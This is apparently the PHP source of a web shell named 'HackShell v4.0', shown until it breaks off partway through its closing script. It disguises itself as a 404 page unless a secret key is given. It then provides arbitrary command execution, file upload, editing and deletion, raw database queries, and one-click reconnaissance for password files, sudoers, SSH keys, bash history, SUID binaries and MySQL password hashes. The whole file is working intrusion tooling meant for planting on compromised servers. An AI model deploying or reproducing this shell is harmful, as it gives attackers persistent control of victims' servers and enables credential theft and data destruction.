<?php
// ──────────────────────────────────────────────
//  HACKSHELL v4.0  –  improved edition
// ──────────────────────────────────────────────
$SECRET_KEY = "x4i9z2k7m8n3p6q0r5t1v8w9y2";
error_reporting(0);

if (!isset($_GET['key']) || $_GET['key'] !== $SECRET_KEY) {
    http_response_code(404);
    echo "<h1>404 - Page Not Found</h1>";
    exit;
}

// ── Helpers ──────────────────────────────────
function sysinfo() {
    return [
        'os'      => php_uname(),
        'php'     => phpversion(),
        'server'  => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
        'disk'    => round(disk_free_space("/")/(1024**3),2).' GB',
        'user'    => get_current_user(),
        'cwd'     => getcwd(),
        'ulimit'  => ini_get('upload_max_filesize'),
        'postmax' => ini_get('post_max_size'),
        'uploads' => ini_get('file_uploads') ? 'Yes' : 'No',
    ];
}

$KEY = $SECRET_KEY;

// ── Directory ─────────────────────────────────
$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (!$dir || !is_dir($dir)) $dir = getcwd();
$parent_dir = dirname($dir);

// ── Command Execution ─────────────────────────
$cmd_result = null;
if (isset($_POST['cmd']) && $_POST['cmd'] !== '') {
    $cwd = isset($_POST['cwd']) && is_dir($_POST['cwd']) ? $_POST['cwd'] : $dir;
    $cmd = 'cd '.escapeshellarg($cwd).' && '.$_POST['cmd'].' 2>&1';
    $cmd_result = shell_exec($cmd);
    if ($cmd_result === null) $cmd_result = "(no output)";
}

// ── File Upload ───────────────────────────────
$upload_result = null;
if (isset($_FILES['upload_file'])) {
    $udir = isset($_POST['upload_dir']) && is_dir($_POST['upload_dir']) ? $_POST['upload_dir'] : $dir;
    $udir = rtrim(realpath($udir),'/').'/';
    $dest = $udir.basename($_FILES['upload_file']['name']);
    if ($_FILES['upload_file']['error'] !== UPLOAD_ERR_OK)
        $upload_result = ['ok'=>false,'msg'=>"Upload error code ".$_FILES['upload_file']['error']];
    elseif (!is_writable($udir))
        $upload_result = ['ok'=>false,'msg'=>"Directory not writable: $udir"];
    elseif (file_exists($dest))
        $upload_result = ['ok'=>false,'msg'=>"File already exists"];
    elseif (move_uploaded_file($_FILES['upload_file']['tmp_name'], $dest))
        $upload_result = ['ok'=>true,'msg'=>"Uploaded → $dest"];
    else
        $upload_result = ['ok'=>false,'msg'=>"Move failed"];
}

// ── File Download ─────────────────────────────
if (isset($_GET['dl'])) {
    $f = realpath($_GET['dl']);
    if ($f && is_file($f)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        header('Content-Length: '.filesize($f));
        readfile($f); exit;
    }
}

// ── File Delete ───────────────────────────────
$delete_result = null;
if (isset($_GET['del'])) {
    $f = realpath($_GET['del']);
    if ($f && is_file($f))  { unlink($f); $delete_result = "Deleted file: $f"; }
    elseif ($f && is_dir($f)) { rmdir($f);  $delete_result = "Deleted dir: $f"; }
    else $delete_result = "Not found: ".$_GET['del'];
}

// ── File Edit ─────────────────────────────────
$edit_file = null; $file_content = null; $edit_result = null;
if (isset($_GET['edit'])) {
    $ef = realpath($_GET['edit']);
    if ($ef && is_file($ef)) { $edit_file = $ef; $file_content = file_get_contents($ef); }
}
if (isset($_POST['save_file'], $_POST['file_content'], $_POST['file_path'])) {
    $fp = realpath($_POST['file_path']);
    if ($fp && is_writable($fp)) {
        file_put_contents($fp, $_POST['file_content']);
        $edit_result = ['ok'=>true,'msg'=>"Saved: $fp"];
    } else {
        $edit_result = ['ok'=>false,'msg'=>"Cannot write: ".($_POST['file_path']??'')];
    }
}

// ── DB Query ──────────────────────────────────
$sql_result = null; $sql_columns = []; $sql_rows = []; $sql_error = null;
if (isset($_POST['sql_query']) && $_POST['sql_query'] !== '') {
    $h = $_POST['db_host']??'localhost';
    $u = $_POST['db_user']??'';
    $p = $_POST['db_pass']??'';
    $n = $_POST['db_name']??'';
    try {
        $dsn = $n ? "mysql:host=$h;dbname=$n;charset=utf8mb4" : "mysql:host=$h;charset=utf8mb4";
        $pdo = new PDO($dsn,$u,$p,[PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION]);
        $stmt = $pdo->query($_POST['sql_query']);
        if ($stmt) {
            $sql_rows    = $stmt->fetchAll(PDO::FETCH_ASSOC);
            $sql_columns = $sql_rows ? array_keys($sql_rows[0]) : [];
            $sql_result  = count($sql_rows)." row(s)";
        } else {
            $sql_result = "Query executed (no result set)";
        }
    } catch (PDOException $e) {
        $sql_error = $e->getMessage();
    }
}

// ── Privilege / Env / Network / Process ───────
$priv_result = isset($_GET['priv']) ? shell_exec("whoami && id && sudo -l 2>&1") : null;
$env_result  = isset($_GET['env'])  ? shell_exec("env 2>&1") : null;
$net_result  = isset($_GET['net'])  ? shell_exec("(netstat -tulnp || ss -tulnp) 2>&1") : null;
$ps_result   = isset($_GET['ps'])   ? shell_exec("ps aux 2>&1") : null;

// ── Chmod ─────────────────────────────────────
$chmod_result = null;
if (isset($_POST['chmod_path'], $_POST['chmod_mode'])) {
    $cp = realpath($_POST['chmod_path']);
    if ($cp) { chmod($cp, octdec($_POST['chmod_mode'])); $chmod_result = "chmod ".$_POST['chmod_mode']." $cp"; }
    else $chmod_result = "Path not found";
}

// ── Compress ──────────────────────────────────
$compress_result = null;
if (isset($_POST['compress'], $_POST['compress_path'])) {
    $cp = realpath($_POST['compress_path']);
    if ($cp && file_exists($cp)) {
        $zn = basename($cp).'.zip'; $zip = new ZipArchive();
        if ($zip->open($zn, ZipArchive::CREATE)===TRUE) {
            if (is_dir($cp)) {
                $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($cp),RecursiveIteratorIterator::SELF_FIRST);
                foreach($it as $f) { if(is_file($f)) $zip->addFile($f,str_replace($cp.'/','',$f)); }
            } else { $zip->addFile($cp,basename($cp)); }
            $zip->close(); $compress_result = "Created: $zn";
        } else { $compress_result = "ZipArchive open failed"; }
    } else { $compress_result = "Path not found"; }
}

// ── File Browser ──────────────────────────────
$entries = [];
foreach (scandir($dir) as $f) {
    if ($f==='.' || $f==='..') continue;
    $fp = $dir.'/'.$f;
    $entries[] = [
        'name'  => $f,
        'path'  => $fp,
        'isdir' => is_dir($fp),
        'size'  => is_file($fp) ? filesize($fp) : 0,
        'perms' => substr(sprintf('%o',fileperms($fp)),-4),
        'mtime' => date('Y-m-d H:i', filemtime($fp)),
    ];
}

$sys = sysinfo();
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>HackShell v4.0</title>
<style>
:root{
  --bg:#0a0a0f; --panel:#0f1117; --border:#1a2a1a; --green:#00ff41;
  --green2:#00cc33; --dim:#336633; --red:#ff4444; --yellow:#ffcc00;
  --blue:#4488ff; --cyan:#00ccff; --text:#ccffcc; --muted:#557755;
  --panel2:#111820; --scrollbar:#1a2a1a;
}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--text);font-family:'Courier New',monospace;font-size:13px;min-height:100vh}
::-webkit-scrollbar{width:6px;height:6px}
::-webkit-scrollbar-track{background:var(--scrollbar)}
::-webkit-scrollbar-thumb{background:var(--dim);border-radius:3px}

/* ── Layout ── */
#root{display:grid;grid-template-columns:260px 1fr;grid-template-rows:auto 1fr;height:100vh;overflow:hidden}
#topbar{grid-column:1/-1;background:var(--panel);border-bottom:1px solid var(--border);
  display:flex;align-items:center;gap:16px;padding:8px 16px;flex-wrap:wrap}
#sidebar{background:var(--panel);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
#main{display:flex;flex-direction:column;overflow:hidden}

/* ── Top bar ── */
.logo{color:var(--green);font-size:15px;font-weight:bold;letter-spacing:2px;text-shadow:0 0 8px var(--green)}
.sysstat{color:var(--muted);font-size:11px;display:flex;flex-direction:column;gap:2px}
.sysstat span{color:var(--green2)}

/* ── Tabs ── */
.tabs{display:flex;gap:2px;background:var(--bg);padding:6px 8px;border-bottom:1px solid var(--border);flex-wrap:wrap}
.tab{padding:4px 12px;cursor:pointer;color:var(--muted);border:1px solid transparent;border-radius:3px;font-size:11px;transition:.15s}
.tab:hover,.tab.active{color:var(--green);border-color:var(--border);background:var(--panel)}

/* ── Panels ── */
.panel{display:none;flex:1;flex-direction:column;overflow:hidden}
.panel.active{display:flex}
.panel-body{flex:1;overflow-y:auto;padding:12px}

/* ── Terminal ── */
#terminal-wrap{display:flex;flex-direction:column;flex:1;overflow:hidden;background:var(--bg)}
#terminal-history{flex:1;overflow-y:auto;padding:10px;font-size:12px;line-height:1.6}
.th-entry{}
.th-prompt{color:var(--green);white-space:pre-wrap}
.th-output{color:var(--text);white-space:pre-wrap;padding:2px 0 8px 2px;border-left:2px solid var(--dim);margin-left:4px;padding-left:8px;margin-bottom:6px}
.th-output.err{color:var(--red)}
#terminal-input-row{display:flex;align-items:center;padding:6px 10px;border-top:1px solid var(--border);background:var(--panel);gap:6px;flex-shrink:0}
#term-prompt-label{color:var(--green);white-space:nowrap;font-size:12px}
#term-input{flex:1;background:transparent;border:none;outline:none;color:var(--green);font-family:inherit;font-size:13px;caret-color:var(--green)}
#term-run{background:var(--green);color:#000;border:none;padding:3px 10px;cursor:pointer;font-family:inherit;font-size:12px;border-radius:2px}
#term-run:hover{background:var(--green2)}

/* ── File browser sidebar ── */
#fb-path{padding:8px;border-bottom:1px solid var(--border);font-size:11px;color:var(--cyan);word-break:break-all;background:var(--panel2)}
#fb-list{flex:1;overflow-y:auto;padding:4px 0}
.fb-item{display:flex;align-items:center;gap:6px;padding:3px 8px;cursor:pointer;border-bottom:1px solid #0d150d;transition:.1s}
.fb-item:hover{background:var(--panel2)}
.fb-item-name{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:12px}
.fb-item.is-dir .fb-item-name{color:var(--yellow)}
.fb-item.is-file .fb-item-name{color:var(--text)}
.fb-icon{font-size:11px;width:14px;text-align:center;flex-shrink:0}
.fb-actions{display:none;gap:4px}
.fb-item:hover .fb-actions{display:flex}
.fb-act{font-size:10px;color:var(--muted);cursor:pointer;padding:1px 4px;border:1px solid var(--border);border-radius:2px}
.fb-act:hover{color:var(--green);border-color:var(--green)}
.fb-act.del:hover{color:var(--red);border-color:var(--red)}
#fb-back{padding:6px 8px;border-bottom:1px solid var(--border);cursor:pointer;color:var(--red);font-size:11px}
#fb-back:hover{background:var(--panel2)}

/* ── Forms & Inputs ── */
.field-row{display:flex;gap:8px;align-items:center;margin-bottom:8px;flex-wrap:wrap}
.field-row label{color:var(--muted);min-width:90px;font-size:11px}
input[type=text],input[type=password],textarea,select{
  background:var(--panel2);color:var(--text);border:1px solid var(--border);
  padding:5px 8px;font-family:inherit;font-size:12px;border-radius:2px;outline:none}
input[type=text]:focus,input[type=password]:focus,textarea:focus{border-color:var(--green)}
textarea{resize:vertical;width:100%}
.btn{background:var(--panel2);color:var(--green);border:1px solid var(--green);
  padding:5px 14px;cursor:pointer;font-family:inherit;font-size:12px;border-radius:2px}
.btn:hover{background:var(--green);color:#000}
.btn.red{border-color:var(--red);color:var(--red)}
.btn.red:hover{background:var(--red);color:#000}
.btn.yellow{border-color:var(--yellow);color:var(--yellow)}
.btn.yellow:hover{background:var(--yellow);color:#000}
.btn.sm{padding:3px 8px;font-size:11px}

/* ── Section header ── */
.sec-hd{color:var(--green);font-size:12px;letter-spacing:1px;margin-bottom:10px;
  border-bottom:1px solid var(--border);padding-bottom:6px;display:flex;align-items:center;justify-content:space-between}

/* ── DB Table ── */
.db-table-wrap{overflow-x:auto;margin-top:10px}
table{border-collapse:collapse;width:100%;font-size:11px}
th{background:var(--panel2);color:var(--green);padding:5px 8px;text-align:left;border:1px solid var(--border);position:sticky;top:0}
td{padding:4px 8px;border:1px solid var(--border);color:var(--text);max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
tr:nth-child(even) td{background:#0c1210}
tr:hover td{background:#141f14}

/* ── Result box ── */
.result-box{background:var(--panel2);border:1px solid var(--border);padding:8px;margin-top:8px;white-space:pre-wrap;font-size:12px;max-height:300px;overflow-y:auto;border-radius:2px}
.result-box.ok{border-color:var(--green2);color:var(--green)}
.result-box.err{border-color:var(--red);color:var(--red)}

/* ── Status badge ── */
.badge{display:inline-block;padding:1px 6px;border-radius:2px;font-size:10px}
.badge.ok{background:#004400;color:var(--green)}
.badge.err{background:#440000;color:var(--red)}

/* ── Chip / quick-action buttons ── */
.quickrow{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px}
.chip{padding:3px 10px;border:1px solid var(--dim);color:var(--muted);cursor:pointer;font-size:11px;border-radius:2px;font-family:inherit}
.chip:hover{border-color:var(--green);color:var(--green)}

/* ── DB cred overlay ── */
#db-cred-modal{display:none;position:fixed;inset:0;background:#000a;z-index:999;align-items:center;justify-content:center}
#db-cred-modal.open{display:flex}
#db-cred-box{background:var(--panel);border:1px solid var(--green);padding:24px;width:380px;border-radius:4px}
#db-cred-box h3{color:var(--green);margin-bottom:14px;font-size:13px}

/* ── Sysinfo grid ── */
.si-grid{display:grid;grid-template-columns:140px 1fr;gap:4px 12px;font-size:12px}
.si-k{color:var(--muted)}
.si-v{color:var(--cyan)}

/* ── Upload drag zone ── */
#dropzone{border:2px dashed var(--dim);padding:20px;text-align:center;color:var(--muted);margin-bottom:10px;border-radius:4px;transition:.2s;cursor:pointer}
#dropzone.over,#dropzone:hover{border-color:var(--green);color:var(--green)}
</style>
</head>
<body>
<div id="root">

<!-- ═══ TOP BAR ═══ -->
<div id="topbar">
  <div class="logo">⬡ HACKSHELL v4.0</div>
  <div class="sysstat">
    <div>OS: <span><?=htmlspecialchars($sys['os'])?></span></div>
    <div>PHP <span><?=htmlspecialchars($sys['php'])?></span> &nbsp;│&nbsp; User: <span><?=htmlspecialchars($sys['user'])?></span> &nbsp;│&nbsp; Disk free: <span><?=htmlspecialchars($sys['disk'])?></span></div>
  </div>
</div>

<!-- ═══ SIDEBAR – File Browser ═══ -->
<div id="sidebar">
  <div id="fb-path" title="<?=htmlspecialchars($dir)?>"><?=htmlspecialchars($dir)?></div>
  <div id="fb-back" onclick="navDir(<?=json_encode($parent_dir)?>)">▲ ..</div>
  <div id="fb-list">
    <?php foreach($entries as $e): ?>
    <div class="fb-item <?=$e['isdir']?'is-dir':'is-file'?>"
         data-path="<?=htmlspecialchars($e['path'])?>"
         data-dir="<?=$e['isdir']?1:0?>"
         onclick="fbClick(this)">
      <span class="fb-icon"><?=$e['isdir']?'📁':'📄'?></span>
      <span class="fb-item-name" title="<?=htmlspecialchars($e['name'])?>"><?=htmlspecialchars($e['name'])?></span>
      <span class="fb-actions">
        <?php if(!$e['isdir']): ?>
        <span class="fb-act" onclick="event.stopPropagation();editFile(<?=json_encode($e['path'])?>)">ED</span>
        <span class="fb-act" onclick="event.stopPropagation();dlFile(<?=json_encode($e['path'])?>)">DL</span>
        <?php endif; ?>
        <span class="fb-act del" onclick="event.stopPropagation();delFile(<?=json_encode($e['path']),json_encode($e['name'])?>)">RM</span>
      </span>
    </div>
    <?php endforeach; ?>
  </div>
  <!-- Upload form embedded in sidebar -->
  <form id="upload-form" method="POST" enctype="multipart/form-data" style="border-top:1px solid var(--border);padding:8px;flex-shrink:0">
    <input type="hidden" name="upload_dir" id="upload_dir" value="<?=htmlspecialchars($dir)?>">
    <div id="dropzone" onclick="document.getElementById('upload_file').click()">Drop file / click to upload</div>
    <input type="file" name="upload_file" id="upload_file" style="display:none" onchange="document.getElementById('upload-form').submit()">
    <?php if($upload_result): ?>
    <div class="result-box <?=$upload_result['ok']?'ok':'err'?>"><?=htmlspecialchars($upload_result['msg'])?></div>
    <?php endif; ?>
  </form>
</div>

<!-- ═══ MAIN ═══ -->
<div id="main">
  <!-- TABS -->
  <div class="tabs">
    <div class="tab active" data-panel="terminal">⬛ Terminal</div>
    <div class="tab" data-panel="database">🗄 Database</div>
    <div class="tab" data-panel="sysinfo">ℹ Sysinfo</div>
    <div class="tab" data-panel="fileops">🔧 File Ops</div>
    <div class="tab" data-panel="network">🌐 Network</div>
    <div class="tab" data-panel="processes">⚙ Processes</div>
    <div class="tab" data-panel="env">🌿 Env</div>
    <div class="tab" data-panel="privesc">🔑 PrivEsc</div>
  </div>

  <!-- ══ TERMINAL PANEL ══ -->
  <div class="panel active" id="panel-terminal">
    <div id="terminal-wrap">
      <div id="terminal-history">
        <?php if($cmd_result !== null): ?>
        <div class="th-entry">
          <div class="th-prompt"><?=htmlspecialchars($_POST['cwd']??$dir)?>$ <?=htmlspecialchars($_POST['cmd']??'')?></div>
          <div class="th-output"><?=htmlspecialchars($cmd_result)?></div>
        </div>
        <?php endif; ?>
      </div>
      <form method="POST" id="term-form">
        <input type="hidden" name="cwd" id="term-cwd" value="<?=htmlspecialchars($dir)?>">
        <div id="terminal-input-row">
          <span id="term-prompt-label"><?=htmlspecialchars($dir)?>$</span>
          <input id="term-input" name="cmd" type="text" autocomplete="off" autocorrect="off"
                 spellcheck="false" autofocus placeholder="whoami">
          <button type="submit" id="term-run" class="btn sm">RUN</button>
        </div>
      </form>
    </div>
    <!-- Quick command chips -->
    <div style="padding:6px 10px;background:var(--panel);border-top:1px solid var(--border);flex-shrink:0">
      <div class="quickrow">
        <div class="chip" onclick="runQuick('whoami')">whoami</div>
        <div class="chip" onclick="runQuick('id')">id</div>
        <div class="chip" onclick="runQuick('uname -a')">uname</div>
        <div class="chip" onclick="runQuick('ls -la')">ls -la</div>
        <div class="chip" onclick="runQuick('cat /etc/passwd')">passwd</div>
        <div class="chip" onclick="runQuick('cat /etc/hosts')">hosts</div>
        <div class="chip" onclick="runQuick('df -h')">df -h</div>
        <div class="chip" onclick="runQuick('find / -perm -4000 -type f 2>/dev/null')">SUID</div>
        <div class="chip" onclick="runQuick('cat /proc/version')">kernel</div>
        <div class="chip" onclick="runQuick('crontab -l')">cron</div>
        <div class="chip" onclick="runQuick('ss -tulnp')">ports</div>
        <div class="chip" onclick="runQuick('env')">env</div>
      </div>
    </div>
  </div>

  <!-- ══ DATABASE PANEL ══ -->
  <div class="panel" id="panel-database">
    <div class="panel-body">
      <div class="sec-hd">
        DATABASE ACCESS
        <div style="display:flex;gap:6px;align-items:center">
          <span id="db-cred-status" class="badge"></span>
          <button class="btn sm" onclick="openDbModal()">✎ Edit Credentials</button>
        </div>
      </div>
      <form method="POST" id="db-form">
        <input type="hidden" name="db_host" id="f_db_host">
        <input type="hidden" name="db_user" id="f_db_user">
        <input type="hidden" name="db_pass" id="f_db_pass">
        <input type="hidden" name="db_name" id="f_db_name">
        <div class="field-row">
          <label>SQL Query</label>
        </div>
        <!-- Quick SQL chips -->
        <div class="quickrow" style="margin-bottom:8px">
          <div class="chip" onclick="setSql('SHOW DATABASES;')">SHOW DBS</div>
          <div class="chip" onclick="setSql('SHOW TABLES;')">SHOW TABLES</div>
          <div class="chip" onclick="setSql('SELECT * FROM information_schema.tables;')">ALL TABLES</div>
          <div class="chip" onclick="setSql('SELECT user,host,authentication_string FROM mysql.user;')">USERS</div>
          <div class="chip" onclick="setSql('SELECT @@version, @@global.version_compile_os;')">VERSION</div>
          <div class="chip" onclick="setSql('SHOW VARIABLES LIKE \\'%secure%\\';')">SEC VARS</div>
        </div>
        <textarea name="sql_query" id="sql_textarea" rows="5"
          placeholder="SELECT * FROM users;"><?=htmlspecialchars($_POST['sql_query']??'')?></textarea>
        <div style="margin-top:8px;display:flex;gap:8px">
          <button type="submit" class="btn">▶ Execute</button>
        </div>
      </form>

      <?php if($sql_error): ?>
      <div class="result-box err">SQL ERROR: <?=htmlspecialchars($sql_error)?></div>
      <?php elseif($sql_result !== null): ?>
      <div class="result-box ok" style="margin-top:8px"><?=htmlspecialchars($sql_result)?></div>
      <?php if($sql_columns): ?>
      <div class="db-table-wrap">
        <table>
          <thead><tr><?php foreach($sql_columns as $c): ?><th><?=htmlspecialchars($c)?></th><?php endforeach; ?></tr></thead>
          <tbody>
            <?php foreach($sql_rows as $row): ?>
            <tr><?php foreach($row as $v): ?><td title="<?=htmlspecialchars((string)$v)?>"><?=htmlspecialchars((string)$v)?></td><?php endforeach; ?></tr>
            <?php endforeach; ?>
          </tbody>
        </table>
      </div>
      <?php endif; ?>
      <?php endif; ?>
    </div>
  </div>

  <!-- ══ SYSINFO PANEL ══ -->
  <div class="panel" id="panel-sysinfo">
    <div class="panel-body">
      <div class="sec-hd">SYSTEM INFORMATION</div>
      <div class="si-grid">
        <div class="si-k">OS</div><div class="si-v"><?=htmlspecialchars($sys['os'])?></div>
        <div class="si-k">PHP Version</div><div class="si-v"><?=htmlspecialchars($sys['php'])?></div>
        <div class="si-k">Server</div><div class="si-v"><?=htmlspecialchars($sys['server'])?></div>
        <div class="si-k">Disk Free</div><div class="si-v"><?=htmlspecialchars($sys['disk'])?></div>
        <div class="si-k">Current User</div><div class="si-v"><?=htmlspecialchars($sys['user'])?></div>
        <div class="si-k">Working Dir</div><div class="si-v"><?=htmlspecialchars($sys['cwd'])?></div>
        <div class="si-k">Upload Limit</div><div class="si-v"><?=htmlspecialchars($sys['ulimit'])?></div>
        <div class="si-k">Post Max</div><div class="si-v"><?=htmlspecialchars($sys['postmax'])?></div>
        <div class="si-k">File Uploads</div><div class="si-v"><?=htmlspecialchars($sys['uploads'])?></div>
      </div>
      <div style="margin-top:20px">
        <div class="sec-hd">QUICK RECON</div>
        <div class="quickrow">
          <a href="?key=<?=$KEY?>&priv=1" class="chip">Check Privileges</a>
          <a href="?key=<?=$KEY?>&env=1" class="chip">Env Variables</a>
          <a href="?key=<?=$KEY?>&net=1" class="chip">Network Info</a>
          <a href="?key=<?=$KEY?>&ps=1" class="chip">Processes</a>
        </div>
      </div>
    </div>
  </div>

  <!-- ══ FILE OPS PANEL ══ -->
  <div class="panel" id="panel-fileops">
    <div class="panel-body">

      <!-- Edit file -->
      <div class="sec-hd">FILE EDITOR</div>
      <?php if($edit_file && $file_content !== null): ?>
      <form method="POST">
        <div style="margin-bottom:6px;color:var(--cyan);font-size:11px">Editing: <?=htmlspecialchars($edit_file)?></div>
        <textarea name="file_content" rows="18"><?=htmlspecialchars($file_content)?></textarea>
        <input type="hidden" name="file_path" value="<?=htmlspecialchars($edit_file)?>">
        <div style="margin-top:8px;display:flex;gap:8px">
          <button type="submit" name="save_file" value="1" class="btn">💾 Save</button>
        </div>
        <?php if($edit_result): ?>
        <div class="result-box <?=$edit_result['ok']?'ok':'err'?>" style="margin-top:6px"><?=htmlspecialchars($edit_result['msg'])?></div>
        <?php endif; ?>
      </form>
      <?php else: ?>
      <div style="color:var(--muted);font-size:12px">Select a file from the browser and click ED to edit.</div>
      <?php if($edit_result): ?>
      <div class="result-box <?=$edit_result['ok']?'ok':'err'?>" style="margin-top:8px"><?=htmlspecialchars($edit_result['msg'])?></div>
      <?php endif; ?>
      <?php endif; ?>

      <!-- Compress -->
      <div class="sec-hd" style="margin-top:20px">COMPRESS</div>
      <form method="POST">
        <div class="field-row">
          <label>Path</label>
          <input type="text" name="compress_path" style="flex:1" placeholder="/var/www/html">
          <button type="submit" name="compress" value="1" class="btn sm">ZIP</button>
        </div>
        <?php if($compress_result): ?>
        <div class="result-box ok"><?=htmlspecialchars($compress_result)?></div>
        <?php endif; ?>
      </form>

      <!-- Chmod -->
      <div class="sec-hd" style="margin-top:20px">CHMOD</div>
      <form method="POST">
        <div class="field-row">
          <label>Path</label>
          <input type="text" name="chmod_path" style="flex:1" placeholder="/var/www/html/file.php">
          <label>Mode</label>
          <input type="text" name="chmod_mode" style="width:60px" placeholder="0755">
          <button type="submit" class="btn sm">SET</button>
        </div>
        <?php if($chmod_result): ?>
        <div class="result-box ok"><?=htmlspecialchars($chmod_result)?></div>
        <?php endif; ?>
      </form>

      <!-- Delete result -->
      <?php if($delete_result): ?>
      <div class="sec-hd" style="margin-top:20px">DELETE RESULT</div>
      <div class="result-box ok"><?=htmlspecialchars($delete_result)?></div>
      <?php endif; ?>
    </div>
  </div>

  <!-- ══ NETWORK PANEL ══ -->
  <div class="panel" id="panel-network">
    <div class="panel-body">
      <div class="sec-hd">NETWORK INTELLIGENCE
        <a href="?key=<?=$KEY?>&net=1" class="btn sm">Refresh</a>
      </div>
      <?php if($net_result): ?>
      <div class="result-box"><?=htmlspecialchars($net_result)?></div>
      <?php else: ?>
      <div style="color:var(--muted);font-size:12px">Click Refresh to load network info.</div>
      <?php endif; ?>
    </div>
  </div>

  <!-- ══ PROCESSES PANEL ══ -->
  <div class="panel" id="panel-processes">
    <div class="panel-body">
      <div class="sec-hd">PROCESS LIST
        <a href="?key=<?=$KEY?>&ps=1" class="btn sm">Refresh</a>
      </div>
      <?php if($ps_result): ?>
      <div class="result-box"><?=htmlspecialchars($ps_result)?></div>
      <?php else: ?>
      <div style="color:var(--muted);font-size:12px">Click Refresh to load process list.</div>
      <?php endif; ?>
    </div>
  </div>

  <!-- ══ ENV PANEL ══ -->
  <div class="panel" id="panel-env">
    <div class="panel-body">
      <div class="sec-hd">ENVIRONMENT VARIABLES
        <a href="?key=<?=$KEY?>&env=1" class="btn sm">Refresh</a>
      </div>
      <?php if($env_result): ?>
      <div class="result-box"><?=htmlspecialchars($env_result)?></div>
      <?php else: ?>
      <div style="color:var(--muted);font-size:12px">Click Refresh to load env vars.</div>
      <?php endif; ?>
    </div>
  </div>

  <!-- ══ PRIVESC PANEL ══ -->
  <div class="panel" id="panel-privesc">
    <div class="panel-body">
      <div class="sec-hd">PRIVILEGE ESCALATION CHECK
        <a href="?key=<?=$KEY?>&priv=1" class="btn sm">Run Check</a>
      </div>
      <?php if($priv_result): ?>
      <div class="result-box"><?=htmlspecialchars($priv_result)?></div>
      <?php else: ?>
      <div style="color:var(--muted);font-size:12px;margin-bottom:16px">Click "Run Check" to run whoami / id / sudo -l</div>
      <?php endif; ?>

      <div class="sec-hd" style="margin-top:20px">COMMON ESCALATION VECTORS</div>
      <div class="quickrow">
        <div class="chip" onclick="switchTab('terminal');runQuick('find / -perm -4000 -type f 2>/dev/null')">SUID binaries</div>
        <div class="chip" onclick="switchTab('terminal');runQuick('cat /etc/sudoers 2>/dev/null')">sudoers</div>
        <div class="chip" onclick="switchTab('terminal');runQuick('cat /etc/crontab && ls /etc/cron*')">crontabs</div>
        <div class="chip" onclick="switchTab('terminal');runQuick('find / -writable -type f -not -path \\'/proc/*\\' 2>/dev/null')">Writable files</div>
        <div class="chip" onclick="switchTab('terminal');runQuick('find / -name \\'*.conf\\' 2>/dev/null | head -40')">Config files</div>
        <div class="chip" onclick="switchTab('terminal');runQuick('ls -la /home/')">Home dirs</div>
        <div class="chip" onclick="switchTab('terminal');runQuick('cat ~/.bash_history 2>/dev/null')">Bash history</div>
        <div class="chip" onclick="switchTab('terminal');runQuick('find / -name id_rsa 2>/dev/null')">SSH keys</div>
      </div>
    </div>
  </div>
</div><!-- #main -->
</div><!-- #root -->

<!-- ═══ DB CREDENTIALS MODAL ═══ -->
<div id="db-cred-modal">
  <div id="db-cred-box">
    <h3>✎ DATABASE CREDENTIALS</h3>
    <div class="field-row"><label>Host</label><input type="text" id="m_db_host" value="" style="flex:1" placeholder="localhost"></div>
    <div class="field-row"><label>User</label><input type="text" id="m_db_user" value="" style="flex:1"></div>
    <div class="field-row"><label>Password</label><input type="password" id="m_db_pass" value="" style="flex:1"></div>
    <div class="field-row"><label>Database</label><input type="text" id="m_db_name" value="" style="flex:1"></div>
    <div style="display:flex;gap:8px;margin-top:14px">
      <button class="btn" onclick="saveDbCreds()">💾 Save</button>
      <button class="btn red" onclick="closeDbModal()">✕ Cancel</button>
      <button class="btn yellow" onclick="clearDbCreds()">🗑 Clear</button>
    </div>
    <div style="color:var(--muted);font-size:10px;margin-top:10px">Credentials stored in browser localStorage — never sent until you run a query.</div>
  </div>
</div>

<script>
const KEY = <?=json_encode($KEY)?>;

// ── Tab switching ─────────────────────────────
document.querySelectorAll('.tab').forEach(t => {
  t.addEventListener('click', () => switchTab(t.dataset.panel));
});
function switchTab(name) {
  document.querySelectorAll('.tab').forEach(t => t.classList.toggle('active', t.dataset.panel===name));
  document.querySelectorAll('.panel').forEach(p => p.classList.toggle('active', p.id==='panel-'+name));
}

// ── File browser nav ─────────────────────────
function navDir(path) {
  window.location.href = '?key='+encodeURIComponent(KEY)+'&dir='+encodeURIComponent(path);
}
function fbClick(el) {
  if (el.dataset.dir==='1') navDir(el.dataset.path);
  // files: do nothing on row click (use action buttons)
}
function editFile(path) {
  window.location.href = '?key='+encodeURIComponent(KEY)+'&dir='+encodeURIComponent(<?=json_encode($dir)?>)+'&edit='+encodeURIComponent(path);
  // auto switch to fileops tab via URL hash – handled on load
}
function dlFile(path) {
  window.location.href = '?key='+encodeURIComponent(KEY)+'&dl='+encodeURIComponent(path);
}
function delFile(path, name) {
  if (!confirm('Delete '+name+'?')) return;
  window.location.href = '?key='+encodeURIComponent(KEY)+'&del='+encodeURIComponent(path)+'&dir='+encodeURIComponent(<?=json_encode($dir)?>);
}

// ── Terminal ──────────────────────────────────
const termHistory = document.getElementById('terminal-history');
const termInput   = document.getElementById('term-input');
const termPrompt  = document.getElementById('term-prompt-label');
const termCwd     = document.getElementById('term-cwd');

// Sync terminal cwd with sidebar dir on page load
termCwd.value = <?=json_encode($dir)?>;
termPrompt.textContent = <?=json_encode($dir)?> + '$';

// Command history (session)
let cmdHist = JSON.parse(sessionStorage.getItem('cmdHist')||'[]');
let histIdx = cmdHist.length;
termInput.addEventListener('keydown', e => {
  if (e.key==='ArrowUp')   { if(histIdx>0) termInput.value=cmdHist[--histIdx]; e.preventDefault(); }
  if (e.key==='ArrowDown') { histIdx=Math.min(histIdx+1,cmdHist.length); termInput.value=cmdHist[histIdx]||''; e.preventDefault(); }
});

// Submit terminal form
document.getElementById('term-form').addEventListener('submit', function(e) {
  // save to history
